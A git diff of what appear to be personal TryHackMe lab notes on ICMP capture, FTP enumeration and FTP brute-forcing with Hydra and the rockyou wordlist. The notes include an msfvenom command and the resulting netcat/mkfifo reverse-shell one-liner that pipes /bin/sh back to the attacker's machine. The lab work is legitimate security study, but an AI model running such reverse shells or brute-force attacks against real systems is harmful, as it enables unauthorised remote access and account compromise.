@@ -11,7 +11,8 @@ sudo tcpdump ip proto \\icmp -i $IFACE
 
 # Use Metasploit to generate the code for a remote shell:
 # 
-msfvenom -p cmd/unix/reverse_netcat lhost=$LOCAL_IP lport=$LOCAL_PORT R
+msfvenom -p cmd/unix/reverse_netcat lhost=$LOCAL_IP \
+	lport=$LOCAL_PORT R
 
 # Spin up a listener using netcat:
 #
@@ -21,7 +22,10 @@ nc -lvp $LOCAL_PORT
 In this exercise, Metasploit generates code that looks like this:
 
 ```bash
-mkfifo /tmp/qdsrgu; nc $LOCAL_IP $LOCAL_PORT 0</tmp/qdsrgu | /bin/sh >/tmp/qdsrgu 2>&1; rm /tmp/qdsrgu
+mkfifo /tmp/qdsrgu; \
+	nc $LOCAL_IP $LOCAL_PORT 0</tmp/qdsrgu | \
+	/bin/sh >/tmp/qdsrgu 2>&1; \
+	rm /tmp/qdsrgu
 ```
 
 ($LOCAL_IP and $LOCAL_PORT aren’t literal — they’re *actually* the local IP address of my machine on TryHackMe’s VPN and my chosen port. Neither of which should be particularly sensitive, but I’m still not going to post it on the internet!)
@@ -34,24 +38,33 @@ What’s going on here?
 
 ### Understanding FTP
 
-The [active vs. passive FTP](https://en.wikipedia.org/wiki/File_Transfer_Protocol#Communication_and_data_transfer) distinction is about how the *server* handles establishing the data channel (the command channel is always set up by the client connecting to the server).
+The active vs. passive FTP distinction is about how the *server* handles establishing the data channel (the command channel is always set up by the client connecting to the server).
 
 * Active FTP: The client opens a port which the server *actively* connects to when establishing the data channel.
 * Passive FTP: The server opens a port which the client connects to when establishing the data channel.
 
+References:
+
+* [File Transfer Protocol (Wikipedia)](https://en.wikipedia.org/wiki/File_Transfer_Protocol)
+
 ### Enumerating FTP
 
-FTP denotes user accounts using a leading tilde; thus `cwd ~admin` will attempt to change the current working directory to the home directory of the `admin` user. [Some (older) FTP daemons have a vulnerability](https://www.exploit-db.com/exploits/20745) where they allow the use of the `cwd` directory before login, and will return an error when attempting to change to a non-existent user directory.
+FTP denotes user accounts using a leading tilde; thus `cwd ~admin` will attempt to change the current working directory to the home directory of the `admin` user. Some (older) FTP daemons have a vulnerability where they allow the use of the `cwd` directory before login, and will return an error when attempting to change to a non-existent user directory.
 
 Use nmap’s -sV option to attempt to probe for the service name and version information behind an open port.
 
 Anonymous FTP logins, if allowed, use the username `anonymous` and a blank password.
 
+* [Solaris 2.6/7.0 - IN.FTPD CWD 'Username' Enumeration](https://www.exploit-db.com/exploits/20745)
+
 ### Exploiting FTP
 
 Hydra can directly try to brute force passwords on remote machines.
 
-Kali’s rockyou.txt.gz is apparently [a list of 14 million passwords](https://github.com/zacheller/rockyou) dumped during [the hack of some service called RockYou](https://techcrunch.com/2009/12/14/rockyou-hack-security-myspace-facebook-passwords/) that I hadn’t previously heard of. Apparently RockYou was a social network that allowed direct connection to other social networks (including Facebook and MySpace)… And stored all of the relevant passwords (including their own) in the clear!
+Kali’s rockyou.txt.gz is apparently a list of 14 million passwords dumped during the hack of some service called RockYou that I hadn’t previously heard of. Apparently RockYou was a social network that allowed direct connection to other social networks (including Facebook and MySpace)… And stored all of the relevant passwords (including their own) in the clear!
+
+* [rockyou.txt wordlist](https://github.com/zacheller/rockyou)
+* [RockYou Hack: From Bad To Worse](https://techcrunch.com/2009/12/14/rockyou-hack-security-myspace-facebook-passwords/)
 
 - - - -
 
